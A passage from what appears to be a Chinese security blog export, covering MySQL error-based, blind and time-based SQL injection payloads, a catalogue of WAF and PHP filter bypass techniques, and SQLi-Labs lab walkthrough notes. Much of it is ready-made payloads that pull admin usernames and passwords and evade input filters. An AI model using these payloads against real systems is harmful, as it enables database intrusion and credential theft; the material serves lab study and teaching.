?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
爆内容
?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
</code></pre><p><strong>注：</strong>使用group by报错注入方式的注意事项</p>
<p>(1)报错语句中的count(*)不可缺少。</p>
<p>(2)from 表也不可缺少。</p>
<h2 id="2、ExtractValue-有长度限制-最长32位"><a href="#2、ExtractValue-有长度限制-最长32位" class="headerlink" title="2、ExtractValue(有长度限制,最长32位)"></a>2、ExtractValue(有长度限制,最长32位)</h2><p>ExtractValue()函数是对XML文档进行查询和修改的函数。</p>
<pre><code>extractvalue()函数有两个参数，在实际注入时第一个参数设为1，第二个参数就是需要爆的数据。
如：extractvalue(1, concat(0x5c,version()))。
同样，在使用中会遇到如下面UpdateXml()类似的相同问题，即如果在爆的数据前不连接其他字符可能会显示不完全。即获取版本号时，第二个参数不能为version(),而应改为concat(0x5c,version())
</code></pre><p>常用语句：</p>
<pre><code>?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e))
?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))
</code></pre><h2 id="3、UpdateXml-有长度限制-最长32位"><a href="#3、UpdateXml-有长度限制-最长32位" class="headerlink" title="3、UpdateXml(有长度限制,最长32位)"></a>3、UpdateXml(有长度限制,最长32位)</h2><p>UpdateXml()函数也是是对XML文档进行查询和修改的函数。</p>
<pre><code>UpdateXml()函数有三个参数，在实际渗透时第一个和第三个参数直接写1即可，第二个参数就是需要爆出的内容，要爆出不同的内容直接修改第二个参数即可。但是在实际使用时注意一个问题：即爆错的内容可能显示不完整。
</code></pre><p>常用语句：</p>
<pre><code>?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
</code></pre><h2 id="4、NAME-CONST-适用于低版本"><a href="#4、NAME-CONST-适用于低版本" class="headerlink" title="4、NAME_CONST(适用于低版本)"></a>4、NAME_CONST(适用于低版本)</h2><pre><code>?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--
不好用
</code></pre><h2 id="5、Error-based-Double-Query-Injection"><a href="#5、Error-based-Double-Query-Injection" class="headerlink" title="5、Error based Double Query Injection"></a>5、Error based Double Query Injection</h2><pre><code>数据库版本
?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1
</code></pre><h1 id="0x03-mysql一般盲注"><a href="#0x03-mysql一般盲注" class="headerlink" title="0x03 mysql一般盲注"></a>0x03 mysql一般盲注</h1><pre><code>使用ascii
AND ascii(substring((SELECT password FROM users where id=1),1,1))=49
使用正则表达式
and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &apos;^[a-n]&apos; LIMIT 0,1)
</code></pre><p>盲注没什么说的，就是利用是否等于，这些函数判断ascii码，脚本跑呗，或者sqlmap</p>
<h1 id="0x04-mysql时间盲注"><a href="#0x04-mysql时间盲注" class="headerlink" title="0x04 mysql时间盲注"></a>0x04 mysql时间盲注</h1><p>时间盲注用两个函数一个是sleep,一个是benchmark，sleep就不说了。</p>
<p>benchmark语法：</p>
<pre><code>BENCHMARK(count,expr)   
BENCHMARK()函数重复countTimes次执行表达式expr
</code></pre><p>常用语句：</p>
<pre><code>union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(&apos;msg&apos;,&apos;by 5 seconds&apos;)),null) from (select database() as current) as tbl

UNION SELECT IF(SUBSTRING(Password,1,1)=&apos;a&apos;,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = &apos;root&apos;
</code></pre><h1 id="0x05-mysql的一些特性在SQL注入中的利用"><a href="#0x05-mysql的一些特性在SQL注入中的利用" class="headerlink" title="0x05 mysql的一些特性在SQL注入中的利用"></a>0x05 mysql的一些特性在SQL注入中的利用</h1><h2 id="1、大小写利用"><a href="#1、大小写利用" class="headerlink" title="1、大小写利用"></a>1、大小写利用</h2><p>不管你表单填写的是什么，插入到mysql数据库的时候，都会变成小写。</p>
<p>如：注册admin时显示用户已存在，你可以尝试ADMIN注册。</p>
<h2 id="2、字符截断利用"><a href="#2、字符截断利用" class="headerlink" title="2、字符截断利用"></a>2、字符截断利用</h2><p>mysql在使用utf8的时候，一个字符的大小的上限为3字节，而当出现四个字节的字符时，是需要用使用utf8mb4编码，不使用的话，会将不识别的四字节的字符连同后面的字符串一同舍弃。</p>
<p>所以只要我们使用ascii&gt;=256的特殊字符就可以绕过了。</p>
<p>如：</p>
<pre><code>UPDATE `wp_comments` SET `comment_content` = &apos;admin特殊字符123456 &apos; WHERE `wp_comments`.`comment_ID` =12;

以上语句插入到数据库的内容就是admin了，后面的123456被特殊字符截断。
</code></pre><h2 id="3、超过长度截断利用"><a href="#3、超过长度截断利用" class="headerlink" title="3、超过长度截断利用"></a>3、超过长度截断利用</h2><p>就是利用数据定义时，定义的长度大小截断。</p>
<p>如：</p>
<pre><code>insert into user values (&apos;admin++++++++++++++++123456&apos;,&apos;123456&apos;);

以上语句，如果长度限制是16位，那么插入到数据库中的时候用户名的123456被截断

用户：admin 密码：123456
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> WAF绕过 </tag>
            
            <tag> MySQL </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入绕过技巧]]></title>
      <url>/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>SQL注入攻击是黑客对数据库进行攻击的常用手段之一。由于程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。<br><a id="more"></a></p>
<h1 id="0x00-sql注入的原因"><a href="#0x00-sql注入的原因" class="headerlink" title="0x00 sql注入的原因"></a>0x00 sql注入的原因</h1><p>sql注入的原因，表面上说是因为 拼接字符串，构成sql语句，没有使用 sql语句预编译，绑定变量。</p>
<p>但是更深层次的原因是，将用户输入的字符串，当成了 “sql语句” 来执行。</p>
<p>比如上面的 String sql = “select id,no from user where id=” + id;<br>我们希望用户输入的 id 的值，仅仅作为一个字符串字面值，传入数据库执行，但是当输入了： 2 or 1=1 时，其中的 or 1=1 并没有作为 where id= 的字面值，而是作为了 sql语句 来执行的。所以其本质是将用户的输入的数据，作为了命令来执行。</p>
<h1 id="0x01-sql注入绕过"><a href="#0x01-sql注入绕过" class="headerlink" title="0x01 sql注入绕过"></a>0x01 sql注入绕过</h1><h2 id="1-1-注释符绕过"><a href="#1-1-注释符绕过" class="headerlink" title="1.1 注释符绕过"></a>1.1 注释符绕过</h2><p>常用注释符：</p>
<pre><code>//, -- , /**/, #, --+, -- -, ;,%00,--a
UNION /**/ Select /**/user，pwd，from user
U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user
</code></pre><h2 id="1-2-大小写绕过"><a href="#1-2-大小写绕过" class="headerlink" title="1.2 大小写绕过"></a>1.2 大小写绕过</h2><pre><code>?id=1+UnIoN/**/SeLeCT
</code></pre><h2 id="1-3-内联注释绕过"><a href="#1-3-内联注释绕过" class="headerlink" title="1.3 内联注释绕过"></a>1.3 内联注释绕过</h2><pre><code>id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- -
</code></pre><p>通常情况下，上面的代码可以绕过过滤器，请注意，我们用的是 Like而不是 =</p>
<h2 id="1-4-双关键字绕过"><a href="#1-4-双关键字绕过" class="headerlink" title="1.4 双关键字绕过"></a>1.4 双关键字绕过</h2><pre><code>?id=1+UNIunionON+SeLselectECT+1,2,3–
</code></pre><h2 id="1-5-编码绕过"><a href="#1-5-编码绕过" class="headerlink" title="1.5 编码绕过"></a>1.5 编码绕过</h2><p>如URLEncode编码，ASCII,HEX,unicode编码绕过</p>
<pre><code>or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。

十六进制编码

SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))

双重编码绕过

?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+

一些unicode编码举例：    
单引号：&apos;
%u0027 %u02b9 %u02bc
%u02c8 %u2032
%uff07 %c0%27
%c0%a7 %e0%80%a7
空白：
%u0020 %uff00
%c0%20 %c0%a0 %e0%80%a0
左括号(:
%u0028 %uff08
%c0%28 %c0%a8
%e0%80%a8
右括号):
%u0029 %uff09
%c0%29 %c0%a9
%e0%80%a9
</code></pre><h2 id="1-6-空格绕过"><a href="#1-6-空格绕过" class="headerlink" title="1.6 空格绕过"></a>1.6 空格绕过</h2><pre><code>两个空格代替一个空格，用Tab代替空格

%20 %09 %0a %0b %0c %0d %a0 /**/

括号绕过空格
在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来
select(user())from dual where 1=1 and 2=2;
</code></pre><h2 id="1-7-万能密钥绕过"><a href="#1-7-万能密钥绕过" class="headerlink" title="1.7 万能密钥绕过"></a>1.7 万能密钥绕过</h2><pre><code>用经典的or 1=1判断绕过,如or ‘swords’ =’swords
</code></pre><h2 id="1-8-号拆解字符串绕过"><a href="#1-8-号拆解字符串绕过" class="headerlink" title="1.8 +,-,.号拆解字符串绕过"></a>1.8 +,-,.号拆解字符串绕过</h2><pre><code>?id=1&apos; or &apos;11+11&apos;=&apos;11+11&apos;
&quot;-&quot;和&quot;.&quot;
</code></pre><h2 id="1-9-like绕过"><a href="#1-9-like绕过" class="headerlink" title="1.9 like绕过"></a>1.9 like绕过</h2><pre><code>?id=1&apos; or 1 like 1 
绕过对“=”，“&gt;”等的过滤
</code></pre><h2 id="2-0-in绕过"><a href="#2-0-in绕过" class="headerlink" title="2.0 in绕过"></a>2.0 in绕过</h2><pre><code>or &apos;1&apos; IN (&apos;swords&apos;)
</code></pre><h2 id="2-1-gt-lt-绕过"><a href="#2-1-gt-lt-绕过" class="headerlink" title="2.1 &gt;,&lt;绕过"></a>2.1 &gt;,&lt;绕过</h2><pre><code>or &apos;password&apos; &gt; &apos;pass&apos;
or 1&lt;3
</code></pre><h2 id="2-2-等价函数与命令绕过"><a href="#2-2-等价函数与命令绕过" class="headerlink" title="2.2 等价函数与命令绕过"></a>2.2 等价函数与命令绕过</h2><p>1.函数或变量</p>
<pre><code>hex()、bin() ==&gt; ascii()

sleep() ==&gt;benchmark()

concat_ws()==&gt;group_concat()

mid()、substr() ==&gt; substring()

@@user ==&gt; user()

@@datadir ==&gt; datadir()

举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　

或者：
substr((select &apos;password&apos;),1,1) = 0x70
strcmp(left(&apos;password&apos;,1), 0x69) = 1
strcmp(left(&apos;password&apos;,1), 0x70) = 0
strcmp(left(&apos;password&apos;,1), 0x71) = -1
</code></pre><p>2.符号</p>
<pre><code>and和or有可能不能使用，可以试下&amp;&amp;和||

=不能使用的情况，可以考虑尝试&lt;、&gt;
</code></pre><p>3.生僻函数</p>
<pre><code>MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’);　　　　　　　　　　

?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))

SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror));　//postgresql

?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))

and extractvalue(1, concat(0x5c, (select user()),0x5c))
</code></pre><h2 id="2-3-反引号-绕过"><a href="#2-3-反引号-绕过" class="headerlink" title="2.3 反引号`绕过"></a>2.3 反引号`绕过</h2><pre><code>select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用
</code></pre><h2 id="2-4-换行符绕过"><a href="#2-4-换行符绕过" class="headerlink" title="2.4 换行符绕过"></a>2.4 换行符绕过</h2><pre><code>%0a、%0d
</code></pre><h2 id="2-5-截断绕过"><a href="#2-5-截断绕过" class="headerlink" title="2.5 截断绕过"></a>2.5 截断绕过</h2><pre><code>%00,%0A,?,/0,////////////////........////////,%80-%99

目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。
././././././././././././././././abc
////////////////////////abc
..1/abc/../1/abc/../1/abc
</code></pre><h2 id="2-6-宽字节绕过"><a href="#2-6-宽字节绕过" class="headerlink" title="2.6 宽字节绕过"></a>2.6 宽字节绕过</h2><pre><code>过滤单引号时，可以试试宽字节

%bf%27 %df%27 %aa%27
</code></pre><h2 id="2-7-N绕过"><a href="#2-7-N绕过" class="headerlink" title="2.7 \N绕过"></a>2.7 \N绕过</h2><p>\N其实相当于NULL字符</p>
<pre><code>select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0
</code></pre><h2 id="2-8-特殊的绕过函数"><a href="#2-8-特殊的绕过函数" class="headerlink" title="2.8 特殊的绕过函数"></a>2.8 特殊的绕过函数</h2><pre><code>1. 通过greatest函数绕过不能使用大小于符号的情况

greatest(a,b)，返回a和b中较大的那个数。
当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用：
mysql&gt; select greatest(ascii(mid(user(),1,1)),150)=150;
 +------------------------------------------+
| greatest(ascii(mid(user(),1,1)),150)=150 |
 +------------------------------------------+
|                                        1 |
 +------------------------------------------+
如果小于150，则上述返回值为True。

2. 通过substr函数绕过不能使用逗号的情况

mid(user() from 1 for 1)
或
substr(user() from 1 for 1)

mysql&gt; select ascii(substr(user() from 1 for 1)) &lt; 150;
 +------------------------------------------+
| ascii(substr(user() from 1 for 1)) &lt; 150 |
 +------------------------------------------+
|                                        1 |
 +------------------------------------------+

3.使用数学运算函数在子查询中报错

exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。

~x 是一个一元运算符，将x按位取补

select exp(~(select*from(select user())a))
mysql报错：
mysql&gt; select exp(~(select*from(select user())a));
ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’

这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是：

(select*from(select user())a) 得到字符串 root@localhost

表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数
</code></pre><h2 id="附：PHP中一些常见的过滤方法及绕过方式"><a href="#附：PHP中一些常见的过滤方法及绕过方式" class="headerlink" title="附：PHP中一些常见的过滤方法及绕过方式"></a>附：PHP中一些常见的过滤方法及绕过方式</h2><pre><code>过滤关键字    and or
php代码    preg_match(&apos;/(and|or)/i&apos;,$id)
会过滤的攻击代码    1 or 1=1 1 and 1=1
绕过方式    1 || 1=1 1 &amp;&amp; 1=1

过滤关键字    and or union
php代码    preg_match(&apos;/(and|or|union)/i&apos;,$id)
会过滤的攻击代码    union select user,password from users
绕过方式    1 &amp;&amp; (select user from users where userid=1)=&apos;admin&apos;

过滤关键字    and or union where
php代码    preg_match(&apos;/(and|or|union|where)/i&apos;,$id)
会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos;
绕过方式    1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos;

过滤关键字    and or union where
php代码    preg_match(&apos;/(and|or|union|where)/i&apos;,$id)
会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos;
绕过方式    1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos;

过滤关键字    and, or, union, where, limit
php代码    preg_match(&apos;/(and|or|union|where|limit)/i&apos;, $id)
会过滤的攻击代码    1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos;
绕过方式    1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;#user_id聚合中user_id为1的user为admin

过滤关键字    and, or, union, where, limit, group by
php代码    preg_match(&apos;/(and|or|union|where|limit|group by)/i&apos;, $id)
会过滤的攻击代码    1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;
绕过方式    1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1

过滤关键字    and, or, union, where, limit, group by, select
php代码    preg_match(&apos;/(and|or|union|where|limit|group by|select)/i&apos;, $id)
会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1
绕过方式    1 &amp;&amp; substr(user,1,1) = &apos;a&apos;

过滤关键字    and, or, union, where, limit, group by, select, &apos;
php代码    preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;)/i&apos;, $id)
会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1
绕过方式    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)

过滤关键字    and, or, union, where, limit, group by, select, &apos;, hex
php代码    preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex)/i&apos;, $id)
会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) = unhex(61)
绕过方式    1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。

过滤关键字    and, or, union, where, limit, group by, select, &apos;, hex, substr
php代码    preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr)/i&apos;, $id)
会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt;
绕过方式    1 &amp;&amp; lpad(user,7,1)

过滤关键字    and, or, union, where, limit, group by, select, &apos;, hex, substr, 空格
php代码    preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr|\s)/i&apos;, $id)
会过滤的攻击代码    1 &amp;&amp; lpad(user,7,1)/td&gt;
绕过方式    1%0b||%0blpad(user,7,1)

过滤关键字    and or union where
php代码    preg_match(&apos;/(and|or|union|where)/i&apos;,$id)
会过滤的攻击代码    1 || (select user from users where user_id = 1) = &apos;admin&apos;
绕过方式    1 || (select user from users limit 1) = &apos;admin&apos;
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> WAF绕过 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLi-Labs学习笔记]]></title>
      <url>/2016/07/29/SQL-Labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能让我们有能力通过结构化查询来管理大型数据库。</p>
<a id="more"></a>
<p>我们将要使用的实验室是SQLi Labs，它是一个可以从<a href="https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。</a></p>
<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>关键代码：</p>
<blockquote>
<p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
</blockquote>
<p>可以看到对于直接 GET 进来的文本没有过滤。<br>同时，在查询语句中，id=’$id’，变量加了引号。这里引号的意思是把输入的 id 当做字符串来处理，取从头开始的最长数字且类型转换为整形进行查询。</p>
<pre><code>?id=12a             显示id为12的用户
?id=1a2a            显示id为1的用户
?id=102a            显示id为102的用户（不存在）
盲注
?id=1%27and+left(version(),1)=5%23                得出数据库版本为5开头
?id=1%27and+length(database())=8%23               数据库名长度为8
?id=1%27and+left(database(),8)=&apos;security&apos;%23      数据库为security
?id=1%27and+length(username)=4%23                 用户名长度为4
?id=1%27and+left(username,4)=&apos;Dumb&apos;%23            用户名为Dumb
?id=1%27and+length(password)=4%23                 密码长度为4
?id=1%27and+left(password,4)=&apos;Dumb&apos;%23            密码为Dumb
</code></pre><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>关键代码：</p>
<blockquote>
<p>$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;</p>
</blockquote>
<p>同样未做过滤，但此处的变量 id 无引号。大概是直接将变量 id 当做整形传入查询。</p>
<pre><code>?id=12  显示 id 为 12 的用户
?id=12a 报错：Unknown column &apos;12a&apos; in &apos;where clause&apos;
?id=%31 显示 id 为 1 的用户
注入测试：
?id=1+and+left(version(),1)=5 直接注入即可得到版本号
</code></pre><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>关键代码：</p>
<blockquote>
<p>$sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;</p>
</blockquote>
<p>未过滤，但变量 id 加了引号和括号。将变量 id 以字符串形式引入，和Less-1很像，但是却又多了个括号，猜测是防止注入语句。</p>
<pre><code>注入测试：
?id=12+and+1=1           显示正确
?id=12+an                不完全语句也显示正确
猜测：括号将变量限制在括号范围内，尝试手动提前匹配括号注入。
?id=12%27                        成功报错：&apos;&apos;12&apos;&apos;) LIMIT 0,1&apos; at line 1
?id=1%27%29and+1=2%23                                无显示，可注入
上面那条语句还原到 SQL 语句时，为：
SELECT * FORM users WHERE id=(&apos;1&apos;)and 1=2#&apos;) LIMIT 0,1
</code></pre><p>将括号提前结束且用 #号注释掉接下来的语句。接下来的注入只要替换 and 1=1 语句就行了。</p>
<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>关键代码：</p>
<blockquote>
<p>$id = ‘“‘ . $id . ‘“‘;</p>
<p>$sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”;</p>
</blockquote>
<p>对变量 id 做了处理。该处理在 id 前后添加双引号。</p>
<pre><code>?id=1%22%29+and+1=2%23            无显示，可注入
SELECT * FROM users WHERE id=(&quot;1&quot;)and 1=2#&quot;) LIMIT 0,1
</code></pre><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>关键代码：</p>
<blockquote>
<p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
</blockquote>
<pre><code>?id=1&apos;and+1=2#
</code></pre><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>关键代码：</p>
<blockquote>
<p>$id = ‘“‘.$id.’”‘;</p>
<p>$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;</p>
</blockquote>
<pre><code>?id=1&quot;and+1=2#
</code></pre><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>关键代码：</p>
<blockquote>
<p>$sql=”SELECT * FROM users WHERE id=((‘$id’)) LIMIT 0,1”;</p>
</blockquote>
<pre><code>?id=1&apos;))and 1=2#
</code></pre><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>关键代码：</p>
<blockquote>
<p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
</blockquote>
<pre><code>?id=1&apos; and 1=2#
</code></pre><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>尝试了很多次，各种组合，但是服务器返回的结果都是一样。<br>尝试 ?id=10000000000<br>返回结果也是正确，因为不存在这么大的 id，所以判断这个页面把正确和错误的信息全部返回一致。<br>于是，使用基于时间的注入，构造以下语句：</p>
<pre><code>?id=1&apos; and sleep(5) %23
</code></pre><p>如果错误，则服务器处理5秒再返回，否则直接返回，找到正确的注入点。</p>
<pre><code>?id=1&apos; and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) %23

?id=1&apos; and if(ascii(substr(database(),1,1))&gt;114, 0, sleep(5)) %23

第一个语句暂停五秒第二个直接返回，判断数据库名的第一个字母为s（ascii为115）
</code></pre><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>又是一个基于时间的注入，尝试了下，注入点在这：</p>
<pre><code>?id=1&quot; and sleep(5) %23
</code></pre><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>这个页面采用 POST 的方法得到数据。于是用 HackBar 修改 post 数据进行测试：</p>
<pre><code>uname=admin&amp;passwd=123&apos;
显示：
 &apos;&apos;123&apos;&apos; LIMIT 0,1&apos; 
去掉单引号
&apos;123&apos;&apos; LIMIT 0,1
再去掉密码的单引号
123&apos; LIMIT 0,1
</code></pre><p>所以确定是单引号注入，直接万能密钥试试：</p>
<pre><code>uname=admin&apos; or &apos;1&apos;=&apos;1 &amp;passwd=123456
</code></pre><p>这里的话有个点：</p>
<p>如果输入：uname=admin’ or ‘1’=’1 &amp;passwd=123456，会显示失败，为什么呢？</p>
<p>首先and的优先级高于or  【就是and先运算】</p>
<p>那么’1’=’1’ and password=’123456’先运算，因为users表里面的password字段没有一个数据时test，右边是false，那么整个表达式就是false</p>
<p>这个时候整个的语句就是：</p>
<pre><code>SELECT username, password FROM users WHERE username=&apos;test&apos; or false LIMIT 0,1
</code></pre><p>数据库里没有test用户，所以就失败了。</p>
<p>而万能密钥的语句是：</p>
<pre><code>SELECT username, password FROM users WHERE username=&apos;admin&apos; or false LIMIT 0,1
</code></pre><p>对于上述的情况，我们在密码字段加入即可</p>
<pre><code>uname=test&amp;passwd=123456&apos; or &apos;1&apos;=&apos;1

SELECT username, password FROM users WHERE username=&apos;test&apos; or true LIMIT 0,1
</code></pre><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>先尝试单引号，双引号。</p>
<p>输入：</p>
<blockquote>
<p>uname=test&amp;passwd=123456”</p>
</blockquote>
<p>报错：</p>
<blockquote>
<p>‘“123456””) LIMIT 0,1’</p>
<p>123456”) LIMIT 0,1</p>
</blockquote>
<p>构造POC：</p>
<blockquote>
<p>uname=test&amp;passwd=123456”) or “1”=”1”#</p>
</blockquote>
<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>先尝试单引号，双引号。</p>
<p>输入：</p>
<blockquote>
<p>uname=test&amp;passwd=123456’</p>
</blockquote>
<p>报错：</p>
<blockquote>
<p>‘’123456’’) LIMIT 0,1’ </p>
<p>123456’) LIMIT 0,1</p>
</blockquote>
<p>构造POC：</p>
<blockquote>
<p>uname=test&amp;passwd=123456’) or (‘1’)=(‘1</p>
<p>或者</p>
<p>uname=test&amp;passwd=123456’) or “1”=”1”#</p>
</blockquote>
<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>先尝试单引号，双引号。</p>
<p>输入：</p>
<blockquote>
<p>uname=test&amp;passwd=123456”</p>
</blockquote>
<p>报错：</p>
<blockquote>
<p>‘“123456”” LIMIT 0,1’ </p>
<p>123456” LIMIT 0,1</p>
</blockquote>
<p>构造POC：</p>
<blockquote>
<p>uname=test&amp;passwd=123456” or “1”=”1”#</p>
<p>或者</p>
<p>uname=test&amp;passwd=123456” or “1”=”1</p>
</blockquote>
<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>这里输入单引号，双引号就不会报错了，我们只能加上永真永假或者时间延迟函数了。</p>
<p>测试发现时间延迟不行。</p>
<blockquote>
<p>uname=test&amp;passwd=123456’ or 1=1#</p>
</blockquote>
<p>直接成功了，</p>
<p>试一下盲注也是可以得。</p>
<blockquote>
<p>uname=test&amp;passwd=123456’ or length(database())=8#</p>
</blockquote>
<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><blockquote>
<p>uname=test&amp;passwd=123456”) or 1=1#</p>
</blockquote>
<p>成功登陆，时间延迟注入试试</p>
<pre><code>uname=test&amp;passwd=123456&quot;)  or if(length(database())=7,1,sleep(5)) #
暂停，说明不对
uname=test&amp;passwd=123456&quot;)  or if(length(database())=8,1,sleep(5)) #
成功登陆
</code></pre><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><pre><code>uname=admin&amp;passwd=123456&apos; where username=&apos;admin&apos; and 1=2 #
对应的SQL语句是：
UPDATE users SET password = &apos;123456&apos; where username=&apos;admin&apos; and 1=2 #&apos; WHERE username=&apos;admin&apos;
</code></pre><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>这是 Header 注入。</p>
<p>意思是，从服务器要求的 Header 头里面找到可以注入的注入点。</p>
<p>从源代码可以看出，服务器将 Header 里面的 user-agent 的值没有经过过滤就带入了 insert into 语句，这就造成了注入。</p>
<pre><code>$uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;];
...
